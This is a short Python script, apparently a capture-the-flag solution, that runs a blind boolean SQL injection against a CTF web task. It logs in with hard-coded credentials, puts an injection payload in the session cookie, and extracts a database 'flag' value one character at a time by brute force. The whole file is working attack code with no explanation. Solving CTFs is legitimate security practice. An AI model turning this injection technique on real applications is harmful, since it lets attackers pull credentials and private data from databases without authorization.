import requests

url = 'http://tasks.ctfd.kncyber.pl:7014/index.php'
login = {'name' : "Robert" , 'pass' : "ohyooth2aeYahthei5In" }
s = requests.Session()
out = s.post(url,login)

password = ""
x = """!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"""
i  = len(password) + 1

while True:
    for element in x:
        cookie = "2ac50429607af2fcb34b2201a4abc9aa' and (select binary substr(flag," + str(i) + ",1) from users) = '" + element + "' -- "
        s.cookies.set("sqool_session", cookie)
        out = s.get(url)
        print(password + element)
        if "Robert!" in out.text:
            i += 1
            password += element
            break

